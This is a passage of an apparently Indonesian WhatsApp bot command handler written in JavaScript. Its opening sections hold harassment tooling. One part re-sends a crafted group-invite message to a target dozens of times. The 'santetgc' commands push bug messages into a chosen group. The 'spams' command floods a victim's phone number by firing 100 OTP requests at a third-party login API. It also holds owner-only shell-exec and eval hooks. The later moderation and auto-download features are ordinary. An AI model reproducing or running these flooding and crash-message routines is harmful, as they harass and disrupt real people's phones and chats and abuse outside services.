CCZAXEdPTF44XzamzKqz1SOYh1NYUAEboCAkHfYlCyPXCL/ABU6vh/gescqaZt4M1awuXQ5AFiTEjR4m3QHDDLeDcpe4MzHMQ2+4UJqCy9tqDYIkgjxBMdJxmVcxUtZ1ySagOBzQoBsSI+PT9sbNm5NF9kc0pnmttkSBdK3AT9CcLIjON/FR+zPhXJ86r6mpcoXTSUwu25UGSokaD3YsNC7efliW4n4fyPI+JKLMjQoOWVJCFJ1DlgxBtH5O+IO6TiU+yihqaTgevfpEtmtqtQZLgAAIR3L9O+TifZ4def4POT5iWeY2mGHG++EAXRMxttHgPPDmHMjP/tI4HZTXZO1kzRDDzhaFMp1Swhe9iZIBF42GknxwPjngvh7hvJmlc4u5guPZSnQYjWv3ZA+PUeeNJ4drVM8It1eYsLDlA24hwKSFueykG83MCJ8ZxRuHs8zPiWvzF/7oo8wp3XQ243UtgIaQJgSTYXNwCesYDZE6GS42EKo7dUz/GOqSyaZ2FU2vVYC07dcaJ9p2X8PUiKdeVvAV4Oh2mZVzUN2PU3mY36dMZ4VKNM/CnjDk/hCNxvgHbhU7DXd/wBsfib263tjlN3qp8EALG0Kv8+uI8MtqTYmD6YKwy2gruNv90YexWxo/wBneeU2RO5g8+HF1a2S3TlQCxqN4N7CUDbzwHgziityDNFv8pyopnTodSo2WBMHyI/cjralMqabS4F6DqUNiAdwcP15sSXDpaC5CwoBHdIsI+HrhbB02Ku4r4UKu2nLg5WqIWJpWyvmdCbxIgX8seybi/hx7I6TK32Xi1SsNtnmtIPuIgGyj4Yx13Mg9oaLNOA0lxHupvr3JP8A7kjwwmmzYMgKQwyi0RCPn6i/z9MGxLU6ri+joeGF5fkzFY3UrJWFcrQgFbnMWAuZ6kD4Yq+S8dcQ5fXO1Dz7tUgAgtPqLgg/H0OKs3XNtPU8Ms2d5l1Aj4g2Px+gwVGcBoVHsKUh0EkAJ7np4H9sLS1olfx5TvcIVNEKaoTX1RUdSWQG4W5rX1kWJ8cZoxWV1JllTTslxuneVodB2UJ2I2O/1wb72S2kamKZxZ0XIRM/xN/jgNbWtVLHLLVOJT7wIPWfXqf+RBolNalS1PNFbiyYtrVPT6YUXOWy+rUUS5Ez5jzviOdZISP7fxsoTjymwG55bJJ/7ttsPpeT2fqU2AxCnbC0teXS18DZda7TUD2gEe8GgfmMENPBY0FZkfmjp9MERS0/MdLbzxcgSAqDM/XBbCtkArHWpQQokF0bMRgvNTpN3LXg082jHqto60IQagjmW1wd/D5YMQ4lCP7jupgaVCMBGKmwqrQZdnV+nB69IwbRFRUEVCx3Ru0Z9w9Iwl5xSa5q65W5BuJ+fzwRDbwqKghTq3NIBMjwO/ywbT2hoD3MaLbzjg8Q0T09McU4S3UFx51ZiPwYHxtg9NVPNOtlCyJVfvX6Y9zVhD+h1aCN/aDY74JommFWpPLprOR6bWG1r4LT8ssrC1LbBcJu2fLwH0x6sqFt8jlkweuoeA6dMKRVu8l3WHCOZ+oPLfxOH2fYi+QXWhzptuGiD/jHlNNFh+axYHM/RJBuOsWw1qFKdcaLiXNZTfU4P5tji57M7PNnVeXB4jpgwfX+v//Z",
                "caption": `${command}\n*https://wa.me/settings*\n${botname} ${(prefix)}`,
              }
            }), {
              userJid: Pe,
              quoted: m
            })
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(10000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(12000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'santetgc': {
          if (!isOwner) return reply(mess.owner)
          let good = text.split(',');
          if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 129xxx@g.us,5\n\n`)
          if (!good[0]) return m.reply(`*Masukan ID Grup!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
          if (!good[1]) return m.reply(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
          try {
            m.reply(`*[ </> ]* Mengirimkan ${command}...`)
            await sleep(1000)
            gcbug(good[0], good[1])
            await sleep(2000)
            m.reply(`*[ </> ]* Done sent!`)
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'santetgc2': {
          if (!text) return m.reply('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.us')
          if (!q.includes("@")) return m.reply('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.ust')
          async function buggi(judul, teks, buttontext, buttonid, target) {
            let msg = generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: name
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      title: judul,
                      subtitle: "Rerezz Official",
                      hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        "name": "quick_reply",
                        "buttonParamsJson": `{\"display_text\":${buttontext},\"id\":${buttonid}}`
                      }],
                    })
                  })
                }
              }
            }, {})

            await sock.relayMessage(msg.key.remoteJid, msg.message, {
              messageId: msg.key.id
            })
          }
          try {
            buggi("Assalamualaikum", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(2000)
            buggi("Kenalin Member Baru", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(4000)
            buggi("Kok Sepi", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(6000)
            buggi("Pada Kemana", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'spams': {
          if (!isOwner) return reply(mess.owner)
          const pushname = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          try {
            if (m.quoted || text) {
              if (pushname.startsWith('08')) return reply('Awali nomor dengan +62')
              if (pushname.startsWith('+447539162479')) return reply('Tidak bisa spam ke nomor ini!')
              let nosms = '+' + pushname.replace('@s.whatsapp.net', '')
              let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
              let ua = mal[Math.floor(Math.random() * mal.length)];
              let axios = require('axios').default;
              let hd = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
              };
              const dat = {
                'phone': nosms
              };
              for (let x = 0; x < 100; x++) {
                axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
                  headers: hd
                }).then(res => {
                  console.log(res);
                }).catch(err => {
                  console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
                });
              }
            } else m.reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +628xxxx`)
            m.reply(`spam sms/call akan di kirim ke no target`)
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break


               default:
                if (budy.startsWith('$')) {
                    if (!isOwner) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                if (budy.startsWith('>')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
                //
                                //anti bad words 
                global.antitoxic = true
// Anti Toxic
if (global.antitoxic && badwords.some(word => budy.toLowerCase().includes(word))) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Menggunakan kata kasar", pushname)
}
sock.newsletterFollow("120363418752112116@newsletter")
const platform = [
    "tiktok.com",
    "instagram.com",
    "fb.com",
    "facebook.com",
    "youtube.com",
    "youtu.be",
    "telegram.me",
    "t.me",
    "discord.gg",
    "twitter.com",
    "x.com"
];

// AUTO DOWNLOAD LINK
if (db.chats[m.chat].autodl) {
    if (platform.some(link => budy.toLowerCase().includes(link))) {
        try {

            async function fetchInitialPage(initialUrl) {
                try {
                    const axios = require('axios')
                    const cheerio = require('cheerio')

                    const headers = {
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
                        'Referer': initialUrl,
                    }

                    const response = await axios.get(initialUrl, { headers })
                    const $ = cheerio.load(response.data)

                    const csrfToken = $('meta[name="csrf-token"]').attr('content')
                    if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')

                    let cookies = ''
                    if (response.headers['set-cookie']) {
                        cookies = response.headers['set-cookie'].join('; ')
                    }

                    return { csrfToken, cookies }

                } catch (err) {
                    throw new Error(`Gagal ambil halaman awal: ${err.message}`)
                }
            }


            async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
                try {
                    const axios = require('axios')

                    const headers = {
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
                        'Referer': 'https://on4t.com/online-video-downloader',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Cookie': cookies
                    }

                    const postData = new URLSearchParams()
                    postData.append('_token', csrfToken)
                    postData.append('link[]', userUrl)

                    const response = await axios.post(downloadUrl, postData.toString(), { headers })

                    if (response.data?.result?.length) {
                        return response.data.result.map(item => ({
                            title: item.title,
                            thumb: item.image,
                            url: item.video_file_url || item.videoimg_file_url
                        }))
                    } else {
                        throw new Error('Respons server tidak sesuai, coba link lain!')
                    }

                } catch (err) {
                    throw new Error(`Gagal proses download: ${err.message}`)
                }
            }


            async function sendMediaAutoType(url, title) {
                try {
                    const axios = require('axios')
                    const { fromBuffer } = require('file-type')

                    const res = await axios.get(url, { responseType: 'arraybuffer' })
                    const buff = Buffer.from(res.data)
                    const fileInfo = await fromBuffer(buff)

                    if (!fileInfo) return reply(`Gagal deteksi tipe file: ${title}`)

                    const mime = fileInfo.mime
                    const ext = fileInfo.ext

                    if (mime.startsWith('video/')) {
                        await sock.sendMessage(m.chat, { video: buff, caption: title }, { quoted: m })

                    } else if (mime.startsWith('audio/')) {
                        await sock.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: m })

                    } else if (mime.startsWith('image/')) {
                        await sock.sendMessage(m.chat, { image: buff, caption: title }, { quoted: m })

                    } else {
                        await sock.sendMessage(m.chat, {
                            document: buff,
                            fileName: `${title}.${ext}`,
                            mimetype: mime
                        }, { quoted: m })
                    }

                } catch (err) {
                    reply(`Gagal kirim media: ${err.message}`)
                }
            }


            // PROSES UTAMA
            const initialUrl = 'https://on4t.com/online-video-downloader'
            const downloadUrl = 'https://on4t.com/all-video-download'

            const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
            const results = await postDownloadRequest(downloadUrl, budy, csrfToken, cookies)

            for (let i = 0; i < results.length; i++) {
                await sendMediaAutoType(results[i].url, results[i].title)
            }

            await sock.sendMessage(m.chat, { react: { text: '💕', key: m.key } })

        } catch (err) {
            await sock.sendMessage(m.chat, { react: { text: '😳', key: m.key } })
            reply(err.message)
        }
    }
}            
// Anti Video
if (db.chats[m.chat].antivideo && m.mtype === 'videoMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.key.participant || m.sender
    }
  })

  await addWarning(sock, m, "Mengirim video", pushname)
}

// Anti Foto
if (db.chats[m.chat].antifoto && m.mtype === 'imageMessage') {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.key.participant || m.sender
    }
  })

  await addWarning(sock, m, "Mengirim foto", pushname)
}

// Anti Tag Status
if (db.chats[m.chat]?.antimention && m.isGroup) {

  const isStatusMention =
    m.messageStubType === 92 ||
    m.message?.protocolMessage?.type === 18 ||
    m.message?.protocolMessage?.type === 19

  if (isStatusMention) {
    if (!isBotAdmins) return
    if (isAdmins || isOwner) return

    await sock.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: m.key.id,
        participant: m.key.participant || m.sender
      }
    })

    await addWarning(sock, m, "Menandai status", pushname)
  }
}
// Anti Wa.me
if (db.chats[m.chat].antiWame && budy.includes('https://wa.me')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan wa.me", pushname)
}

// Anti Link Grup
if (db.chats[m.chat].Antilinkgc && budy.includes('https://chat.whatsapp')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan grup", pushname)
}

// Anti Link Channel
if (db.chats[m.chat].Antilinkch && budy.includes('https://whatsapp.com/channel/')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan channel", pushname)
}

// Anti Link IG
if (db.chats[m.chat].Antilinkig && budy.includes('https://www.instagram.com/')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan Instagram", pushname)
}

// Anti Semua Link
if (db.chats[m.chat].Antilinkall && budy.includes('https://')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Mengirim tautan", pushname)
}

// Anti Judol 🤑
if (db.chats[m.chat].antijudol && budy.includes('🤑')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Simbol judi 🤑", pushname)
}

// Anti Judol 💸
if (db.chats[m.chat].antijudol2 && budy.includes('💸')) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  await sock.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  })

  await addWarning(sock, m, "Simbol judi 💸", pushname)
}
//
global.salam = true
if (global.salam)
  if (budy.includes("ssalamu")) {

			    sock.sendMessage(from, {text:`waalaikumsalam`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
if ((budy.match) && ["bot"].includes(budy)) {

			    sock.sendMessage(m.chat, {
        audio: {
          url: "https://raw.githubusercontent.com/zionjs0/whatsapp-media/main/file_1762425260617.m4a"
        },
        mimetype: 'audio/mpeg',
        ptt: false
      }, {
        quoted: fakeQuoted
      })
}
//
                if (budy.startsWith('<')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})      